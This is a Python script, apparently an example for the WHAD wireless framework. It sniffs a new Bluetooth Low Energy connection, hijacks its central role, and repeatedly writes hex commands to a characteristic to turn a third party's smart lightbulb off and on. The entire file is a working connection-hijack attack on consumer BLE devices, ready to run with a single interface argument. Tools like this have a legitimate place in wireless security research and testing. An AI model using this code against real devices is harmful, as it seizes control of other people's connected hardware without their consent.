from whad.ble import Sniffer, Hijacker, Central
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.ble.exceptions import ConnectionLostException
from time import time,sleep
from whad.ble.profile import UUID
from scapy.all import BTLE_DATA, L2CAP_Hdr, ATT_Hdr, ATT_Write_Request
import sys


def show(pkt):
    print(repr(pkt.metadata))
    pkt.show()

if __name__ == '__main__':
    if len(sys.argv) >= 2:
        # Retrieve target interface
        interface = sys.argv[1]

        # Connect to target device and performs discovery
        try:
            dev = WhadDevice.create(interface)

            sniffer = Sniffer(dev)
            connection = sniffer.wait_new_connection()
            print("Press enter to hijack.")

            hijacker = Hijacker(dev, connection)
            success = hijacker.hijack(master=True, slave=False)
            if success:
                print("Master successfully hijacked !")
                central = Central(dev, existing_connection=connection)
                periph = central.peripheral()

                periph.discover()

                c = periph.get_characteristic(
                    UUID("a8b3fff0-4834-4051-89d0-3de95cddd318"),
                    UUID("a8b3fff1-4834-4051-89d0-3de95cddd318")
                )
                while True:
                    print("Press enter to turn off the lightbulb.")
                    input()
                    c.write(bytes.fromhex("5510000d0a"))
                    print("Press enter to turn on the lightbulb.")
                    input()
                    c.write(bytes.fromhex("5510010d0a"))

            else:
                print("Fail, exiting...")

        except ConnectionLostException as e:
            print("Connection lost")

        except (KeyboardInterrupt, SystemExit):
            dev.close()

        except WhadDeviceNotFound:
            print('[e] Device not found')
            exit(1)
    else:
        print('Usage: %s [device]' % sys.argv[0])
